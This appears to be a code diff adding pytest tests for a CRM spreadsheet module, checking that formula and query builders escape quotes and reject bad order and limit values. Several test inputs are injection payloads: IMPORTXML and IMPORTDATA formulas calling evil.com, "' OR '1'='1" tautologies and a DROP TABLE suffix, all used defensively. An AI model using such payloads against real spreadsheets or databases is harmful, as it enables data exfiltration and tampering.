@@ -95,3 +95,64 @@ def test_dashboard_formulas():
         '=IF(ISBLANK(BATCHES!F11); ""; BATCHES!F11)',
         '=IF(ISBLANK(BATCHES!K11); ""; BATCHES!K11)',
     ]
+
+import pytest
+from crm_cockpit import (
+    escape_formula_string,
+    escape_query_string_literal,
+    q,
+    count_formula,
+    cockpit_blocks,
+    cockpit_values,
+)
+
+def test_escape_formula_string():
+    assert escape_formula_string('simple') == 'simple'
+    assert escape_formula_string('hello "world"') == 'hello ""world""'
+    assert escape_formula_string('test"; IMPORTXML("http://evil.com") & "') == 'test""; IMPORTXML(""http://evil.com"") & ""'
+
+def test_escape_query_string_literal():
+    assert escape_query_string_literal('Joel') == 'Joel'
+    assert escape_query_string_literal("O'Connor") == r"O\'Connor"
+    assert escape_query_string_literal("test' OR '1'='1") == r"test\' OR \'1\'=\'1"
+    assert escape_query_string_literal(r"test\path'quote") == r"test\\path\'quote"
+
+def test_q_sanitization_and_validation():
+    # Test valid q generation
+    res = q("BE = 'Abgemeldet'", order="BC desc", limit=10)
+    expected = '=IFERROR(QUERY(ALL_LEADS!A2:BE; "select B, G, I, BE, AP, AR, AC where BE = \'Abgemeldet\' order by BC desc limit 10"; 0); "— keine —")'
+    assert res == expected
+
+    # Test formula string double quotes escaping inside where clause
+    res_quotes = q("AA contains 'Joel\"'")
+    assert 'Joel""' in res_quotes
+
+    # Test order validation
+    with pytest.raises(ValueError, match="Invalid order clause"):
+        q("BE = 'Abgemeldet'", order="BC desc; DROP TABLE LEADS")
+
+    # Test limit validation
+    with pytest.raises(ValueError, match="Invalid limit parameter"):
+        q("BE = 'Abgemeldet'", limit="invalid")
+
+    with pytest.raises(ValueError, match="Invalid limit parameter"):
+        q("BE = 'Abgemeldet'", limit=-5)
+
+def test_security_cockpit_blocks_and_values_injection_prevention():
+    # Single quote injection attempt in owner_match
+    malicious_owner = "Joel' OR '1'='1"
+    blocks = cockpit_blocks(malicious_owner)
+    # Ensure single quote is escaped as \'
+    assert r"AA contains 'Joel\' OR \'1\'=\'1'" in blocks[0]["formula"]
+
+    # Double quote formula injection attempt in owner_match and mailbox
+    formula_inj_owner = 'Joel"; IMPORTXML("http://evil.com", "//a") & "'
+    formula_inj_mailbox = 'user@test.de"; IMPORTDATA("http://evil.com") & "'
+
+    counts = [count_formula(formula_inj_owner, "Abgemeldet")]
+    assert 'Joel""; IMPORTXML' in counts[0]
+
+    vals = cockpit_values(formula_inj_owner, formula_inj_mailbox)
+    # Check that mailbox in VLOOKUP has doubled quotes
+    vlookup_str = vals[1][0]
+    assert 'user@test.de""; IMPORTDATA' in vlookup_str
